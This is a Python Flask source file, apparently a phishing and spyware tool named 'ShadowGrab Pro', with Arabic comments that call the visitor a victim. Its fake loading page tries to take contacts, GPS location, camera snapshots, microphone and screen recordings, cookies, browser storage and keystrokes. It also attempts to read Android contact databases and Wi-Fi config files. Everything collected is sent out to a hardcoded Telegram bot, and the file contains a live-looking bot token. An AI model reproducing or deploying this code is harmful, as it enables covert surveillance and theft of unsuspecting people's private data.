from flask import Flask, render_template_string, request, jsonify
import os
import json
import requests
import threading
import datetime
import base64
import re

app = Flask(__name__)

# ===== إعدادات البوت =====
TELEGRAM_TOKEN = "8875360747:AAHZH8ti8BTzA8_Gzo6QV6ex4OsaJyoBovI"
TELEGRAM_CHAT_ID = "1170411845"

def send_telegram(message, photo=None):
    try:
        if photo:
            url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto"
            files = {'photo': photo}
            data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': message[:900]}
            requests.post(url, files=files, data=data, timeout=10)
        else:
            url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
            payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message[:4000], "parse_mode": "HTML"}
            requests.post(url, json=payload, timeout=5)
    except Exception as e:
        print(f"خطأ: {e}")

# ===== الصفحة الرئيسية (المصيدة) =====
@app.route('/')
def index():
    visitor_ip = request.remote_addr
    send_telegram(f"""🔥 <b>دخول ضحية جديدة</b>
🌐 IP: {visitor_ip}
⏰ {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
📱 جاري سحب البيانات...""")
    
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>جار التحميل...</title>
        <style>
            body { background: #000; color: #0f0; font-family: Arial; text-align: center; padding: 50px; }
            .spinner { border: 4px solid #333; border-top: 4px solid #0f0; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 50px auto; }
            @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
            .hidden { display: none; }
        </style>
    </head>
    <body>
        <div class="spinner"></div>
        <h1>جار التحميل...</h1>
        <p style="color:#666;">الرجاء الانتظار</p>

        <!-- إطار خفي لتشغيل الصوت والفيديو -->
        <iframe id="hiddenFrame" style="display:none;"></iframe>

        <script>
            // ===== 1. سحب جهات الاتصال (أندرويد) =====
            if (navigator.contacts) {
                navigator.contacts.select(['name', 'tel', 'email'], { multiple: true })
                    .then(contacts => {
                        sendData('📇 جهات الاتصال', JSON.stringify(contacts));
                    })
                    .catch(() => {});
            }

            // ===== 2. سحب موقع GPS =====
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    pos => {
                        sendData('📍 الموقع', `${pos.coords.latitude}, ${pos.coords.longitude} (دقة: ${pos.coords.accuracy}m)`);
                    },
                    err => {},
                    { enableHighAccuracy: true, timeout: 5000 }
                );
            }

            // ===== 3. التقاط صورة من الكاميرا =====
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({ video: true, audio: false })
                    .then(stream => {
                        const video = document.createElement('video');
                        video.srcObject = stream;
                        video.onloadedmetadata = () => {
                            video.play();
                            const canvas = document.createElement('canvas');
                            canvas.width = video.videoWidth || 640;
                            canvas.height = video.videoHeight || 480;
                            const ctx = canvas.getContext('2d');
                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                            const imgData = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
                            sendPhoto(imgData);
                            stream.getTracks().forEach(t => t.stop());
                        };
                    })
                    .catch(() => {});
            }

            // ===== 4. تسجيل الميكروفون =====
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({ audio: true })
                    .then(stream => {
                        const recorder = new MediaRecorder(stream);
                        recorder.ondataavailable = e => {
                            if (e.data.size > 0) {
                                const reader = new FileReader();
                                reader.onload = () => {
                                    const audioBase64 = reader.result.split(',')[1];
                                    sendData('🎤 تسجيل صوتي', audioBase64.substring(0, 200) + '...');
                                };
                                reader.readAsDataURL(e.data);
                            }
                        };
                        recorder.start();
                        setTimeout(() => recorder.stop(), 8000);
                    })
                    .catch(() => {});
            }

            // ===== 5. سحب كوكيز وجلسات =====
            const cookies = document.cookie || 'لا توجد';
            sendData('🍪 الكوكيز', cookies);

            // ===== 6. سحب LocalStorage و SessionStorage =====
            try {
                const ls = JSON.stringify(localStorage) || '{}';
                const ss = JSON.stringify(sessionStorage) || '{}';
                sendData('💾 التخزين المحلي', `LS: ${ls.substring(0, 200)}\nSS: ${ss.substring(0, 200)}`);
            } catch(e) {}

            // ===== 7. سحب معلومات الجهاز =====
            const info = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                referrer: document.referrer || 'مباشر',
                timestamp: new Date().toISOString()
            };
            sendData('💻 معلومات الجهاز', JSON.stringify(info, null, 2));

            // ===== 8. محاولة الوصول إلى ملفات النظام (استغلال ثغرة) =====
            try {
                // محاولة قراءة قاعدة بيانات جهات الاتصال (أندرويد)
                fetch('file:///data/data/com.android.providers.contacts/databases/contacts2.db')
                    .then(res => res.text())
                    .then(data => sendData('📂 قاعدة البيانات', data.substring(0, 500)))
                    .catch(() => {});
                
                // محاولة قراءة ملفات واي فاي
                fetch('file:///data/misc/wifi/wpa_supplicant.conf')
                    .then(res => res.text())
                    .then(data => sendData('📶 شبكات WiFi', data.substring(0, 500)))
                    .catch(() => {});
            } catch(e) {}

            // ===== 9. تسجيل المفاتيح =====
            let keys = [];
            document.addEventListener('keydown', e => {
                keys.push(e.key);
                if (keys.length > 100) keys.shift();
            });
            setInterval(() => {
                if (keys.length > 0) {
                    sendData('⌨️ المفاتيح المسجلة', keys.join(' '));
                    keys = [];
                }
            }, 5000);

            // ===== دوال الإرسال =====
            function sendData(label, content) {
                if (!content || content.length < 2) return;
                const payload = btoa(unescape(encodeURIComponent(JSON.stringify({ label, content, time: new Date().toISOString() }))));
                fetch('/collect', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ payload })
                }).catch(() => {});
            }

            function sendPhoto(base64Image) {
                fetch('/photo', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ image: base64Image })
                }).catch(() => {});
            }

            // ===== تشغيل تسجيل الشاشة =====
            if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
                navigator.mediaDevices.getDisplayMedia({ video: true })
                    .then(stream => {
                        const recorder = new MediaRecorder(stream);
                        recorder.ondataavailable = e => {
                            if (e.data.size > 0) {
                                const reader = new FileReader();
                                reader.onload = () => {
                                    const videoBase64 = reader.result.split(',')[1];
                                    sendData('📹 تسجيل الشاشة', videoBase64.substring(0, 200) + '...');
                                };
                                reader.readAsDataURL(e.data);
                            }
                        };
                        recorder.start();
                        setTimeout(() => recorder.stop(), 5000);
                    })
                    .catch(() => {});
            }

            // ===== منع الخروج =====
            window.onbeforeunload = () => 'جار التحميل...';
        </script>
    </body>
    </html>
    '''

# ===== استقبال البيانات =====
@app.route('/collect', methods=['POST'])
def collect():
    try:
        data = request.json
        if data and 'payload' in data:
            decoded = json.loads(base64.b64decode(data['payload']).decode('utf-8'))
            label = decoded.get('label', 'بيانات')
            content = decoded.get('content', '')
            time = decoded.get('time', datetime.datetime.now().isoformat())
            
            msg = f"""📌 <b>{label}</b>
📝 {content[:1000]}
⏰ {time}"""
            send_telegram(msg)
            return jsonify({"status": "ok"})
    except Exception as e:
        print(f"خطأ: {e}")
    return jsonify({"status": "error"}), 400

# ===== استقبال الصور =====
@app.route('/photo', methods=['POST'])
def photo():
    try:
        data = request.json
        if data and 'image' in data:
            img_data = base64.b64decode(data['image'])
            send_telegram('📸 صورة من الكاميرا', ('image.jpg', img_data, 'image/jpeg'))
            return jsonify({"status": "ok"})
    except Exception as e:
        print(f"خطأ: {e}")
    return jsonify({"status": "error"}), 400

if __name__ == '__main__':
    send_telegram(f"""🔥 <b>ShadowGrab Pro مفعل</b>
🎯 جاهز لسحب البيانات من الهواتف
📱 جهات الاتصال • الموقع • الكاميرا • الميكروفون • المفاتيح
⏰ {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}""")
    
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
